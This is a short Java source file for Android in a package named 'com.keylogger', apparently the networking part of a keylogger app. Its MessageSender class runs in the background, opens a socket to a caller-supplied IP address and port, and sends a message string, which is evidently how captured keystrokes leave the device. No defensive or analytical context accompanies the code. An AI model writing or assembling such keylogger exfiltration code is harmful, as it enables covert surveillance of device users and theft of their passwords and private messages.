package com.keylogger;
import android.os.*;
import java.net.Socket;
import java.io.*;

public class MessageSender extends AsyncTask<String,Void,Void>
{
	Socket s;
	DataOutputStream dos;
	PrintWriter pw;

	@Override
	protected Void doInBackground(String... voids)
	{	
		String message = voids[0];
		String ip=voids[1];
		int port= Integer.parseInt(voids[2]);
		try
		{
			s = new Socket(ip, port);
			pw =  new PrintWriter(s.getOutputStream());
			pw.write(message.concat("\n"));
			pw.flush();
			s.close();
		}
		catch (IOException e)
		{
			e.printStackTrace();
		}
		return null;
	}
	
	
}

